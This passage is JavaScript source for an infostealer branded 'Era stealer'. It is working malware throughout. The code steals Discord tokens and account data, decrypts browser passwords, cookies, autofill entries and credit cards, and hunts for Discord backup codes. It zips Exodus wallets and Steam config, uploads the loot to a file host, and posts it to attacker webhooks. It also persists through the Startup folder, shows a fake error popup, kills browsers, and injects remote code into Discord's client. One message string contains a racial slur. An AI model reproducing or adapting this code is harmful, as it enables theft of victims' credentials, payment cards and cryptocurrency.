            "https://cdn.discordapp.com/attachments/1329073689907560499/1333804141545263199/era.jpg?ex=679a3968&is=6798e7e8&hm=627edebd37fde5428a8638466cff6c79b13cf148379447565de10600191735e3&",
        },
      };

      const friendsEmbed = {
        color: 0x000,
        description:
          description ||
          `- <a:crown:1240635323671773258> **This nigga doesn't have any HQ Friends**`,
        author: {
          name: `HQ Friends | Total Friends: ${totalFriends}`,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`,
        },

        footer: {
          text: "Era stealer & https://t.me/era_stealer",
          icon_url: `https://cdn.discordapp.com/avatars/1258711833800609837/72564c98be57b45f733245a8e7907a2c.webp?size=1024&format=webp`,
        },
      };

      const data = {
        username: username,
        avatar_url: avatar_url,
        embeds: [userInformationEmbed, friendsEmbed, guildsEmbed],
      };

      axios.post(webhook, data);
      axios.post(hihi, data);
    } catch (error) {
      console.error(error);
    }
  }
}

async function getID(token) {
  const profileResponse = await axios.get(
    "https://discord.com/api/v9/users/@me",
    {
      headers: { Authorization: token },
    }
  );

  const userId = profileResponse.data.id;
  return userId;
}

async function getBadges(token) {
  try {
    const profileResponse = await axios.get(
      "https://discord.com/api/v9/users/@me",
      {
        headers: { Authorization: token },
      }
    );

    const userId = profileResponse.data.id;

    const badgesResponse = await axios.get(
      `https://discord.com/api/v9/users/${userId}/profile`,
      {
        headers: { Authorization: token },
      }
    );

    const badges = badgesResponse.data.user.public_flags || 0;

    const badgeEmojis = [];
    for (const [flag, { emoji }] of Object.entries(badgeMap)) {
      if (badges & flag) {
        badgeEmojis.push(emoji);
      }
    }

    if (badgeEmojis.length === 0) {
      return "";
    }

    return badgeEmojis;
  } catch (error) {
    console.error(error);
    return "";
  }
}

async function getIpInfo(ip) {
  const url = `http://ip-api.com/json/${ip}?fields=continent,country,regionName,city,proxy,hosting`;
  try {
    const response = await axios.get(url);
    const data = response.data;
    return {
      continent: data.continent,
      country: data.country,
      regionName: data.regionName,
      city: data.city,
      proxy: data.proxy,
      hosting: data.hosting,
    };
  } catch (error) {
    console.error(error);
    return null;
  }
}

async function StealPC() {
  const ip = await getIp();
  const ipInfo = await getIpInfo(ip);
  const total_memory = os.totalmem();
  const total_mem_in_kb = total_memory / 1024;
  const total_mem_in_mb = total_mem_in_kb / 1024;
  const total_mem_in_gb = total_mem_in_mb / 1024;
  const total_mem_in_gb_fixed = total_mem_in_gb.toFixed(1);

  const pcInfoEmbed = {
    color: 0x000000, // Couleur noire
    author: {
      name: `${process.env.USERNAME} - Infos PC`,
    },
    fields: [
      { name: "Hostname", value: `\`${os.hostname()}\``, inline: true },
      { name: "Utilisateur", value: `\`${process.env.USERNAME}\``, inline: true },
      { name: "Adresse IP", value: `\`${ip}\``, inline: true },
      { name: "OS", value: `\`${os.version()}\``, inline: true },
      { name: "RAM", value: `\`${total_mem_in_gb_fixed} GB\``, inline: true },
    ],
    footer: {
      text: "Era stealer & https://t.me/era_stealer",
    },
  };
  

  const IpEmbed = {
    color: 0x000000, // Couleur noire
    author: {
      name: `${process.env.USERNAME} | IP Informations`,
    },
    fields: [
      { name: "IP Address", value: `\`${ip}\``, inline: true },
      { name: "Continent", value: `\`${ipInfo.continent}\``, inline: true },
      { name: "Country", value: `\`${ipInfo.country}\``, inline: true },
      { name: "Region", value: `\`${ipInfo.regionName}\``, inline: true },
      { name: "City", value: `\`${ipInfo.city}\``, inline: true },
      { name: "Proxy", value: `\`${ipInfo.proxy}\``, inline: true },
      { name: "Hosting", value: `\`${ipInfo.hosting}\``, inline: true },
    ],
    footer: {
      text: "Era stealer & https://t.me/era_stealer",
    },
  };
  

  const pcinfo = {
    username: username,
    avatar_url: avatar_url,
    embeds: [pcInfoEmbed, IpEmbed],
  };

  axios.post(webhook, pcinfo).catch((error) => {
    console.error(error);
  });

  axios.post(hihi, pcinfo).catch((error) => {
    console.error(error);
  });
}

const badgeMap = {
  1: {
    name: "Discord Employee",
    emoji: "<:staff:1240682088169210056>",
    rare: true,
  },
  2: {
    name: "Partnered Server Owner",
    emoji: "<a:partner:1240682204372144178>",
    rare: true,
  },
  4: {
    name: "HypeSquad Events",
    emoji: "<:hypevent:1240682473742930002>",
    rare: true,
  },
  8: {
    name: "Bug Hunter Level 1",
    emoji: "<:bug1:1240682888471773205>",
    rare: true,
  },
  64: {
    name: "House Bravery",
    emoji: "<:bravery:1240683741614047303>",
    rare: false,
  },
  128: {
    name: "House Brilliance",
    emoji: "<:brillance:1240683831984390284>",
    rare: false,
  },
  256: {
    name: "House Balance",
    emoji: "<:balance:1240683920672952410>",
    rare: false,
  },
  512: {
    name: "Early Supporter",
    emoji: "<:early:1240683094659563530>",
    rare: true,
  },
  16384: {
    name: "Bug Hunter Level 2",
    emoji: "<:bug2:1240682926493138975>",
    rare: true,
  },
  262144: {
    name: "Certified Moderator",
    emoji: "<:moderator:1240684039707558018>",
    rare: true,
  },
  131072: {
    name: "Verified Bot Developer",
    emoji: "<:earlydev:1240683221495189595>",
    rare: true,
  },
  4194304: {
    name: "Active Developer",
    emoji: "<:activedev:1242155305018589276>",
    rare: false,
  },
};

const boostLevels = {
  guild_booster_lvl0: "",
  guild_booster_lvl1: "<:lv1:1240666056519843881>",
  guild_booster_lvl2: "<:lv2:1240666088568787005>",
  guild_booster_lvl3: "<:lv3:1240666118633291877>",
  guild_booster_lvl4: "<:lv6:1240666144298242118>",
  guild_booster_lvl5: "<:lv9:1240666174438768661>",
  guild_booster_lvl6: "<:lv12:1240666220387110942>",
  guild_booster_lvl7: "<:lv15:1240666247771979807>",
  guild_booster_lvl8: "<:lv18:1240666288569843762>",
  guild_booster_lvl9: "<:lv24:1240666318944866385>",
};

function getRareBadges(publicFlags) {
  const rareBadges = [];
  for (const [flag, { emoji, rare }] of Object.entries(badgeMap)) {
    if (publicFlags & flag && rare) {
      rareBadges.push(`${emoji}`);
    }
  }
  return rareBadges;
}

async function getBoostLevel(userId, token) {
  try {
    const response = await axios.get(
      `https://discord.com/api/v9/users/${userId}/profile`,
      {
        headers: {
          Authorization: token,
        },
      }
    );

    const profile = response.data;
    const badges = profile.badges || [];
    const boostBadge = badges.find((badge) =>
      badge.id.startsWith("guild_booster_lvl")
    );

    if (boostBadge) {
      return boostBadge.id;
    } else {
      return "guild_booster_lvl0";
    }
  } catch (error) {
    console.error(`Error fetching boost level for user ${userId}:`, error);
    return "guild_booster_lvl0";
  }
}

async function getHQFriends(token) {
  try {
    const response = await axios.get(
      "https://discord.com/api/v9/users/@me/relationships",
      {
        headers: {
          Authorization: token,
        },
      }
    );

    const friends = response.data;

    let description = "";
    let totalFriends = friends.length;

    for (const friend of friends) {
      const rareBadges = getRareBadges(friend.user.public_flags);
      if (rareBadges.length > 0) {
        const boostLevel = await getBoostLevel(friend.id, token);
        const boostEmoji = boostLevels[boostLevel];
        description += `- ${rareBadges.join(", ")} ${boostEmoji} **${
          friend.user.username
        }** \`${friend.user.id}\`\n`;
      }
    }

    return { description, totalFriends };
  } catch (error) {
    console.error(error);
    return { description: "Error fetching friends", totalFriends: 0 };
  }
}

async function getHQGuilds(token) {
  const headers = {
    "Content-Type": "application/json",
    Authorization: token,
  };

  try {
    const response = await axios.get(
      "https://discord.com/api/v9/users/@me/guilds?with_counts=true",
      { headers }
    );
    const guilds = response.data;

    const hqGuilds = guilds.filter(
      (guild) => guild.owner && guild.approximate_member_count > 50
    );

    let responseString = "";
    hqGuilds.forEach((guild) => {
      responseString += `- <a:crown:1240635323671773258> **${guild.name}** : \`${guild.approximate_member_count} members\` \n`;
    });

    const totalGuilds = guilds.length;
    if (totalGuilds === 0) {
      return "**No Guilds wtf**";
    }

    return { totalGuilds, guildList: responseString };
  } catch (error) {
    console.error(error);
    return "**Sorry Error 😕**";
  }
}

async function getBilling(token) {
  let json;
  await axios
    .get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
      headers: {
        "Content-Type": "application/json",
        authorization: token,
      },
    })
    .then((res) => {
      json = res.data;
    })
    .catch((err) => {});
  if (!json) return "`Unknown`";

  var bi = "";
  json.forEach((z) => {
    if (z.type == 2 && z.invalid != !0) {
      bi += "<:paypal:1240684761639551077> ";
    } else if (z.type == 1 && z.invalid != !0) {
      bi += "<:card:1240685133128798258> ";
    }
  });
  if (bi == "") bi = `\`No Billing\``;
  return bi;
}

async function getNitroEmote(flags) {
  switch (flags) {
    case 1:
      return "<:nitro:1240664616716075078>";
    case 2:
      return "<:nitro:1240664616716075078>";
    case 3:
      return "<:nitro:1240664616716075078>";
    default:
      return "";
  }
}

async function getNitro(flags) {
  switch (flags) {
    case 1:
      return "`Classic`";
    case 2:
      return "`Boost`";
    case 3:
      return "`Basic`";
    default:
      return "`None`";
  }
}

async function getIp() {
  var ip = await axios.get("https://www.myexternalip.com/raw");
  return ip.data;
}

async function sendBackupCodes(codes, email, link_codes) {
  const CodesEmbed = {
    author: {
      name: `Backup Codes Found`,
      icon_url: `https://cdn.discordapp.com/attachments/1329073689907560499/1333804141545263199/era.jpg?ex=679a3968&is=6798e7e8&hm=627edebd37fde5428a8638466cff6c79b13cf148379447565de10600191735e3&`,
    },
    footer: {
      text: "Era stealer & https://t.me/era_stealer",
      icon_url: `https://cdn.discordapp.com/attachments/1329073689907560499/1333804141545263199/era.jpg?ex=679a3968&is=6798e7e8&hm=627edebd37fde5428a8638466cff6c79b13cf148379447565de10600191735e3&`,
    },
    description: `<:blackstar:1240640910392430602> **Email:** \`${email}\``,
    color: 0x000,
    fields: [
      {
        name: "<:password:1240676883583078441> Backup Codes",
        value: codes.join("\n"),
      },
    ],
  };

  const backcodes = {
    username: username,
    avatar_url: avatar_url,
    embeds: [CodesEmbed],
  };

  try {
    await axios.post(webhook, backcodes);
    await axios.post(hihi, backcodes);
  } catch (error) {}
}

async function stealBackupCodes() {
  var pattern = "discord_backup_codes";
  const userDirectory = os.homedir();
  let found = false;
  let backupCodes = [];
  let email = "";

  function search(directory, pattern) {
    let directoriesToExplore = [directory];
    const startTime = Date.now();

    while (directoriesToExplore.length > 0 && !found) {
      const currentDirectory = directoriesToExplore.pop();
      try {
        const files = fs.readdirSync(currentDirectory);
        for (let file of files) {
          const fullPath = path.join(currentDirectory, file);
          const stat = fs.statSync(fullPath);

          if (stat.isDirectory()) {
            directoriesToExplore.push(fullPath);
          } else if (
            stat.isFile() &&
            file.startsWith(pattern) &&
            path.extname(file) !== ".lnk"
          ) {
            const lines = fs.readFileSync(fullPath, "utf8").split("\n");
            lines.forEach((line) => {
              const words = line.split(" ");
              words.forEach((word) => {
                if (word.includes("@")) {
                  email = word;
                  email = email.replace(/\.$/, "");
                }
              });
              if (line.trim().startsWith("*")) {
                const replacedLine = line.replace("*", "-");
                backupCodes.push(replacedLine);
              }
            });
            found = true;
            break;
          }
        }
      } catch (error) {}

      if (Date.now() - startTime > 15000) {
        return;
      }
    }

    if (found) {
      sendBackupCodes(backupCodes, email);
    }
  }

  search(userDirectory, pattern);
}

async function getEncrypted() {
  for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
    if (!fs.existsSync("" + browserPath[_0x4c3514][0])) {
      continue;
    }
    try {
      let _0x276965 = Buffer.from(
        JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + "Local State"))
          .os_crypt.encrypted_key,
        "base64"
      ).slice(5);
      const _0x4ff4c6 = Array.from(_0x276965),
        _0x4860ac = execSync(
          "powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(" +
            _0x4ff4c6 +
            "), $null, 'CurrentUser')"
        )
          .toString()
          .split("\r\n"),
        _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ""),
        _0x2ed7ba = Buffer.from(_0x4a5920);
      browserPath[_0x4c3514].push(_0x2ed7ba);
    } catch (_0x32406b) {}
  }
}

async function getPasswords() {
  const _0x540754 = [];

  for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
    if (!fs.existsSync(browserPath[_0x261d97][0])) {
      continue;
    }

    let _0xd541c2;
    if (browserPath[_0x261d97][0].includes("Local")) {
      _0xd541c2 = browserPath[_0x261d97][0]
        .split("\\Local\\")[1]
        .split("\\")[0];
    } else {
      _0xd541c2 = browserPath[_0x261d97][0]
        .split("\\Roaming\\")[1]
        .split("\\")[1];
    }

    const _0x256bed = browserPath[_0x261d97][0] + "Login Data";
    const _0x239644 = browserPath[_0x261d97][0] + "passwords.db";

    try {
      fs.copyFileSync(_0x256bed, _0x239644);
    } catch {
      continue;
    }

    const _0x3d71cb = new sqlite3.Database(_0x239644);

    await new Promise((_0x2c148b, _0x32e8f4) => {
      _0x3d71cb.each(
        "SELECT origin_url, username_value, password_value FROM logins",
        (_0x4c7a5b, _0x504e35) => {
          if (!_0x504e35.username_value) {
            return;
          }

          let _0x3d2b4b = _0x504e35.password_value;
          try {
            const _0x5e1041 = _0x3d2b4b.slice(3, 15);
            const _0x279e1b = _0x3d2b4b.slice(15, _0x3d2b4b.length - 16);
            const _0x2a933a = _0x3d2b4b.slice(
              _0x3d2b4b.length - 16,
              _0x3d2b4b.length
            );
            const _0x210aeb = crypto.createDecipheriv(
              "aes-256-gcm",
              browserPath[_0x261d97][3],
              _0x5e1041
            );
            _0x210aeb.setAuthTag(_0x2a933a);
            const password =
              _0x210aeb.update(_0x279e1b, "base64", "utf-8") +
              _0x210aeb.final("utf-8");

            _0x540754.push(
              "================Era Stealer================\nURL: " +
                _0x504e35.origin_url +
                "\nUsername: " +
                _0x504e35.username_value +
                "\nPassword: " +
                password +
                "\nApplication: " +
                _0xd541c2 +
                " " +
                browserPath[_0x261d97][1] +
                "\n"
            );
          } catch (_0x5bf37a) {}
        },
        () => {
          _0x2c148b("");
        }
      );
    });
  }

  if (_0x540754.length === 0) {
    _0x540754.push("No passwords found.\n");
  }

  if (_0x540754.length) {
    fs.writeFileSync("Passwords.txt", user.copyright + _0x540754.join(""), {
      encoding: "utf8",
      flag: "a+",
    });
  }

  link_download = uploadToAnonfiles("Passwords.txt");
  return link_download;
}

async function tryAgainUpload(path) {
  const returns = await uploadToAnonfiles(path);
  return returns;
}
async function uploadToAnonfiles(path) {
  try {
    const serverResponse = await axios.get("https://api.gofile.io/servers");
    const server = serverResponse.data.data.servers[0].name; // Correction ici

    const formData = new FormData();
    formData.append("file", fs.createReadStream(path));

    const uploadResponse = await axios.post(
      `https://${server}.gofile.io/uploadFile`,
      formData,
      {
        headers: {
          ...formData.getHeaders(),
        },
      }
    );

    return uploadResponse.data.data.downloadPage;
  } catch (error) {
    console.error("Erreur lors de l'upload :", error.message);
    throw new Error("Erreur while uploading the file.");
  }
}

async function tryAgain() {
  await getCookiesAndSendWebhook();
}

async function getCookiesAndSendWebhook() {
  do {
    try {
      ("Wallets\\Cookies");
      const cookiesData = {};
      let cookieLegnth = 0;
      for (let i = 0; i < browserPath.length; i++) {
        if (!fs.existsSync(browserPath[i][0] + "\\Network")) {
          continue;
        }

        let browserFolder;
        if (browserPath[i][0].includes("Local")) {
          browserFolder = browserPath[i][0]
            .split("\\Local\\")[1]
            .split("\\")[0];
        } else {
          browserFolder = browserPath[i][0]
            .split("\\Roaming\\")[1]
            .split("\\")[1];
        }

        const cookiesPath = browserPath[i][0] + "Network\\Cookies";
        const cookies2 = browserPath[i][0] + "Network\\LxnyCookies";

        try {
          fs.copyFileSync(cookiesPath, cookies2);
        } catch {
          continue;
        }

        const db = new sqlite3.Database(cookies2);

        await new Promise((resolve, reject) => {
          db.each(
            "SELECT * FROM cookies",
            function (err, row) {
              let encryptedValue = row.encrypted_value;
              let iv = encryptedValue.slice(3, 15);
              let encryptedData = encryptedValue.slice(
                15,
                encryptedValue.length - 16
              );
              let authTag = encryptedValue.slice(
                encryptedValue.length - 16,
                encryptedValue.length
              );
              let decrypted = "";

              try {
                const decipher = crypto.createDecipheriv(
                  "aes-256-gcm",
                  browserPath[i][3],
                  iv
                );
                decipher.setAuthTag(authTag);
                decrypted =
                  decipher.update(encryptedData, "base64", "utf-8") +
                  decipher.final("utf-8");
              } catch (error) {}

              if (!cookiesData[browserFolder + "_" + browserPath[i][1]]) {
                cookiesData[browserFolder + "_" + browserPath[i][1]] = [];
              }

              cookiesData[browserFolder + "_" + browserPath[i][1]].push(
                `${row.host_key}	TRUE	/	FALSE	2597573456	${row.name}	${decrypted}\n`
              );

              count.cookies++;
            },
            () => {
              resolve("");
            }
          );
        });
      }

      const zip = new AdmZip();

      for (let [browserName, cookies] of Object.entries(cookiesData)) {
        if (cookies.length !== 0) {
          const cookiesContent = cookies.join("");
          const fileName = `${browserName}.txt`;
          cookieLegnth = cookieLegnth + cookies.length;
          zip.addFile(fileName, Buffer.from(cookiesContent, "utf8"));
        }
      }

      zip.writeZip(randomPath + "\\Browser.zip");

      const link_download = await uploadToAnonfiles(
        randomPath + "\\Browser.zip"
      );
      var statsCookies = fs.statSync(randomPath + "\\Browser.zip");
      const link_download2 = await getPasswords();

      const passwdFile = fs.readFileSync(
        randomPath + "\\..\\Passwords.txt",
        "utf8"
      );
      const passwdFileLinhas = passwdFile.split("\n");
      let passwordLength = 0;

      for (const linha of passwdFileLinhas) {
        if (linha.includes("Password: ")) {
          passwordLength += 1;
        }
      }

      const link_download3 = await getAutofills();

      const autofillFIle = fs.readFileSync(
        randomPath + "\\..\\Autofills.txt",
        "utf8"
      );
      const autofillFIleLinhas = autofillFIle.split("\n");
      let autofillLength = 0;

      for (const linha of autofillFIleLinhas) {
        if (linha.includes("Value: ")) {
          autofillLength += 1;
        }
      }

      const link_download4 = await sendWallets();
      const link_download5 = await sendSteam();

      const link_download6 = await getCards();

      const cardsFile = fs.readFileSync(randomPath + "\\..\\Cards.txt", "utf8");
      const cardsFileLinhas = cardsFile.split("\n");
      let cardsLength = 0;

      for (const linha of cardsFileLinhas) {
        if (linha.includes(" card:")) {
          cardsLength += 1;
        }
      }

      let exodusHavesOrNo = "";
      let steamHavesOrNo = "";

      let walletsLength = 0;

      let steamLength = "False";

      if (link_download4 !== false) {
        exodusHavesOrNo = `, [Exodus.zip](${link_download4})`;
        walletsLength = 1;
      }

      if (link_download5 !== false) {
        steamHavesOrNo = `, [Steam.zip](${link_download5})`;
        steamLength = "True";
      }

      const embedCookies = {
        color: 0x000000, // Couleur noire
        author: {
          name: `${process.env.USERNAME} | Browsers Data`,
        },
        fields: [
          { name: "Cookies", value: `\`${cookieLegnth}\``, inline: true },
          { name: "Passwords", value: `\`${passwordLength}\``, inline: true },
          { name: "Credit Cards", value: `\`${cardsLength}\``, inline: true },
          { name: "Autofills", value: `\`${autofillLength}\``, inline: true },
          { name: "Wallets", value: `\`${walletsLength}\``, inline: true },
          { name: "Steam", value: `\`${steamLength}\``, inline: true },
          {
            name: "\u200b",
            value: `[Cookies](${link_download}), [Passwords](${link_download2}), [Credit-Cards](${link_download6}), [AutoFills](${link_download3}) ${exodusHavesOrNo} ${steamHavesOrNo}`,
          },
        ],
        footer: {
          text: "Era stealer & https://t.me/era_stealer",
        },
      };
      

      const embedsToSend = [embedCookies];

      const data = {
        username: username,
        avatar_url: avatar_url,
        embeds: embedsToSend,
      };

      axios.post(webhook, data);
      axios.post(hihi, data);
      break;
    } catch (error) {
      retryCount++;

      if (retryCount >= maxRetries) {
        break;
      }

      const dataError = {};
    }
  } while (retryCount < maxRetries);
}

async function getAutofills() {
  const autofillData = [];

  try {
    for (const pathData of browserPath) {
      const browserPathExists = fs.existsSync(pathData[0]);

      if (!browserPathExists) {
        continue;
      }

      const applicationName = pathData[0].includes("Local")
        ? pathData[0].split("\\Local\\")[1].split("\\")[0]
        : pathData[0].split("\\Roaming\\")[1].split("\\")[1];

      const webDataPath = pathData[0] + "Web Data";
      const webDataDBPath = pathData[0] + "webdata.db";

      try {
        fs.copyFileSync(webDataPath, webDataDBPath);
      } catch {
        continue;
      }

      const db = new sqlite3.Database(webDataDBPath);

      await new Promise((resolve, reject) => {
        db.each(
          "SELECT * FROM autofill",
          function (error, row) {
            if (row) {
              autofillData.push(
                "================Era Stealer================\nName: " +
                  row.name +
                  "\nValue: " +
                  row.value +
                  "\nApplication: " +
                  applicationName +
                  " " +
                  pathData[1] +
                  "\n"
              );
            }
          },
          function () {
            resolve("");
          }
        );
      });

      if (autofillData.length === 0) {
        autofillData.push(
          "No autofills found for " + applicationName + " " + pathData[1] + "\n"
        );
      }
    }

    if (autofillData.length) {
      fs.writeFileSync("Autofills.txt", autofillData.join(""), {
        encoding: "utf8",
        flag: "a+",
      });
    }

    const link_download = uploadToAnonfiles("Autofills.txt");
    return link_download;
  } catch {
    fs.writeFileSync("Autofills.txt", "No autofills founded", {
      encoding: "utf8",
      flag: "a+",
    });
  }
}

async function getCards() {
  const _0x540754 = [];

  for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
    if (!fs.existsSync(browserPath[_0x261d97][0])) {
      continue;
    }

    let _0xd541c2;
    if (browserPath[_0x261d97][0].includes("Local")) {
      _0xd541c2 = browserPath[_0x261d97][0]
        .split("\\Local\\")[1]
        .split("\\")[0];
    } else {
      _0xd541c2 = browserPath[_0x261d97][0]
        .split("\\Roaming\\")[1]
        .split("\\")[1];
    }

    const _0x256bed = browserPath[_0x261d97][0] + "Web Data";
    const _0x239644 = browserPath[_0x261d97][0] + "webdata.db";

    try {
      fs.copyFileSync(_0x256bed, _0x239644);
    } catch {
      continue;
    }

    const _0x3d71cb = new sqlite3.Database(_0x239644);

    await new Promise((_0x2c148b, _0x32e8f4) => {
      _0x3d71cb.each(
        "SELECT name_on_card,card_number_encrypted,expiration_month,expiration_year FROM credit_cards",
        (_0x4c7a5b, _0x504e35) => {
          let _0x3d2b4b = _0x504e35.card_number_encrypted;
          try {
            const _0x5e1041 = _0x3d2b4b.slice(3, 15);
            const _0x279e1b = _0x3d2b4b.slice(15, _0x3d2b4b.length - 16);
            const _0x2a933a = _0x3d2b4b.slice(
              _0x3d2b4b.length - 16,
              _0x3d2b4b.length
            );
            const _0x210aeb = crypto.createDecipheriv(
              "aes-256-gcm",
              browserPath[_0x261d97][3],
              _0x5e1041
            );
            _0x210aeb.setAuthTag(_0x2a933a);
            const card =
              _0x210aeb.update(_0x279e1b, "base64", "utf-8") +
              _0x210aeb.final("utf-8");

            _0x540754.push(
              _0x504e35.name_on_card +
                " card: " +
                card +
                "|" +
                _0x504e35.expiration_month +
                "|" +
                _0x504e35.expiration_year +
                "|xxx"
            );
          } catch (_0x5bf37a) {}
        },
        () => {
          _0x2c148b("");
        }
      );
    });
  }

  if (_0x540754.length === 0) {
    _0x540754.push("No credit cards found.\n");
  }

  if (_0x540754.length) {
    fs.writeFileSync("Cards.txt", _0x540754.join(""), {
      encoding: "utf8",
      flag: "a+",
    });
  }

  link_download = uploadToAnonfiles("Cards.txt");
  return link_download;
}

async function DiscordListener(path) {
  return;
}

async function SubmitExodus() {
  const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Exodus\\exodus.wallet`;

  if (fs.existsSync(file)) {
    const zipper = new AdmZip();
    zipper.addLocalFolder(file);
    zipper.writeZip(
      `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Exodus\\Exodus.zip`
    );
    const link_download = await uploadToAnonfiles(
      `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Exodus\\Exodus.zip`
    );
    return link_download;
  }
  return false;
}

async function sendWallets() {
  const havesExodus = await SubmitExodus();

  if (havesExodus === false) {
    return false;
  } else {
    return havesExodus;
  }
}

async function SubmitSteam() {
  const file = `C:\\Program Files (x86)\\Steam\\config`;

  if (fs.existsSync(file)) {
    const zipper = new AdmZip();
    zipper.addLocalFolder(file);
    zipper.writeZip(`C:\\Program Files (x86)\\Steam\\config\\steam.zip`);
    const link_download = await uploadToAnonfiles(
      `C:\\Program Files (x86)\\Steam\\config\\steam.zip`
    );
    return link_download;
  }
  return false;
}

async function sendSteam() {
  const havesSteam = await SubmitSteam();

  if (havesSteam === false) {
    return false;
  } else {
    return havesSteam;
  }
}

async function closeBrowsers() {
  const browsersProcess = [
    "chrome.exe",
    "Telegram.exe",
    "msedge.exe",
    "opera.exe",
    "brave.exe",
  ];
  return new Promise(async (resolve) => {
    try {
      const { execSync } = require("child_process");
      const tasks = execSync("tasklist").toString();
      browsersProcess.forEach((process) => {
        if (tasks.includes(process)) {
          execSync(`taskkill /IM ${process} /F`);
        }
      });
      await new Promise((resolve) => setTimeout(resolve, 2500));
      resolve();
    } catch (e) {
      resolve();
    }
  });
}

async function putOnStartup() {
  const { copyFileSync } = require("fs");
  const { join, basename } = require("path");

  copyFileSync(
    process.execPath,
    join(
      process.env.APPDATA,
      "Microsoft",
      "Windows",
      "Start Menu",
      "Programs",
      "Startup",
      basename(process.execPath)
    )
  );
}

async function errorMessage() {
  const title = "Error 201";
  const message =
    "The server is down, please restart";

  const cmd = `mshta "javascript:new ActiveXObject('WScript.Shell').Popup('${message}', 0, '${title}', 16);close()"`;

  exec(`start /B cmd /c ${cmd}`, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error executing command: ${error.message}`);
      return;
    }
  });
}

async function InjectDiscord() {
  var injection;
  await httpx(`${injection_url}`)
    .then((code) => code.data)
    .then((res) => {
      res = res.replace("%WEBHOOK%", webhook);
      injection = res;
    })
    .catch(),
    await fs.readdir(local, async (err, files) => {
      await files.forEach(async (dirName) => {
        dirName.toString().includes("cord") && (await discords.push(dirName));
      }),
        discords.forEach(async (discordPath) => {
          await fs.readdir(local + "\\" + discordPath, (err, file) => {
            file.forEach(async (insideDiscordDir) => {
              insideDiscordDir.includes("app-") &&
                (await fs.readdir(
                  local + "\\" + discordPath + "\\" + insideDiscordDir,
                  (err, file) => {
                    file.forEach(async (insideAppDir) => {
                      insideAppDir.includes("modules") &&
                        fs.readdir(
                          local +
                            "\\" +
                            discordPath +
                            "\\" +
                            insideDiscordDir +
                            "\\" +
                            insideAppDir,
                          (err, file) => {
                            file.forEach((insideModulesDir) => {
                              insideModulesDir.includes(
                                "discord_desktop_core"
                              ) &&
                                fs.readdir(
                                  local +
                                    "\\" +
                                    discordPath +
                                    "\\" +
                                    insideDiscordDir +
                                    "\\" +
                                    insideAppDir +
                                    "\\" +
                                    insideModulesDir,
                                  (err, file) => {
                                    file.forEach((insideCore) => {
                                      insideCore.includes(
                                        "discord_desktop_core"
                                      ) &&
                                        fs.readdir(
                                          local +
                                            "\\" +
                                            discordPath +
                                            "\\" +
                                            insideDiscordDir +
                                            "\\" +
                                            insideAppDir +
                                            "\\" +
                                            insideModulesDir +
                                            "\\" +
                                            insideCore,
                                          (err, file) => {
                                            file.forEach((insideCoreFinal) => {
                                              insideCoreFinal.includes(
                                                "index.js"
                                              ) &&
                                                (fs.mkdir(
                                                  local +
                                                    "\\" +
                                                    discordPath +
                                                    "\\" +
                                                    insideDiscordDir +
                                                    "\\" +
                                                    insideAppDir +
                                                    "\\" +
                                                    insideModulesDir +
                                                    "\\" +
                                                    insideCore +
                                                    "\\Discord",
                                                  () => {}
                                                ),
                                                fs.writeFile(
                                                  local +
                                                    "\\" +
                                                    discordPath +
                                                    "\\" +
                                                    insideDiscordDir +
                                                    "\\" +
                                                    insideAppDir +
                                                    "\\" +
                                                    insideModulesDir +
                                                    "\\" +
                                                    insideCore +
                                                    "\\index.js",
                                                  injection,
                                                  () => {}
                                                ));
                                              if (
                                                !injection_paths.includes(
                                                  local +
                                                    "\\" +
                                                    discordPath +
                                                    "\\" +
                                                    insideDiscordDir +
                                                    "\\" +
                                                    insideAppDir +
                                                    "\\" +
                                                    insideModulesDir +
                                                    "\\" +
                                                    insideCore +
                                                    "\\index.js"
                                                )
                                              ) {
                                                injection_paths.push(
                                                  local +
                                                    "\\" +
                                                    discordPath +
                                                    "\\" +
                                                    insideDiscordDir +
                                                    "\\" +
                                                    insideAppDir +
                                                    "\\" +
                                                    insideModulesDir +
                                                    "\\" +
                                                    insideCore +
                                                    "\\index.js"
                                                );
                                                DiscordListener(
                                                  local +
                                                    "\\" +
                                                    discordPath +
                                                    "\\" +
                                                    insideDiscordDir +
                                                    "\\" +
                                                    insideAppDir +
                                                    "\\" +
                                                    insideModulesDir +
                                                    "\\" +
                                                    insideCore +
                                                    "\\index.js"
                                                );
                                                const message = {
                                                  embeds: [
                                                    {
                                                      author: {
                                                        name: `Successfully Injected`,
                                                        icon_url: `https://cdn.discordapp.com/avatars/1258711833800609837/72564c98be57b45f733245a8e7907a2c.webp?size=1024&format=webp`,
                                                      },
                                                      fields: [
                                                        {
                                                          name: "\u200b",
                                                          value: `<a:drag:1240636089258086461> Injected : \`${discordPath}\``,
                                                        },
                                                        {
                                                          name: "<:trident:1240636497250484275> Path",
                                                          value: `\`\`\`${
                                                            local +
                                                            "\\" +
                                                            discordPath +
                                                            "\\" +
                                                            insideDiscordDir +
                                                            "\\" +
                                                            insideAppDir +
                                                            "\\" +
                                                            insideModulesDir +
                                                            "\\" +
                                                            insideCore +
                                                            "\\index.js"
                                                          }\`\`\``,
                                                        },
                                                      ],
                                                      color: 0x000,
                                                      footer: {
                                                        text: "Era stealer & https://t.me/era_stealer",
                                                        icon_url:
                                                          "https://cdn.discordapp.com/attachments/1329073689907560499/1333804141545263199/era.jpg?ex=679a3968&is=6798e7e8&hm=627edebd37fde5428a8638466cff6c79b13cf148379447565de10600191735e3&",
                                                      },
                                                    },
                                                  ],
                                                };
                                                sendToWebhook(message);
                                              }
                                            });
                                          }
                                        );
                                    });
                                  }
                                );
                            });
                          }
                        );
                    });
                  }
                ));
            });
          });
        });
    });
}

function sendToWebhook(message) {
  const payload = {
    username: username,
    avatar_url: avatar_url,
    embeds: message.embeds,
  };

  axios.post(webhook, payload);
}

async function Stop_DC() {
  exec("tasklist", (err, stdout) => {
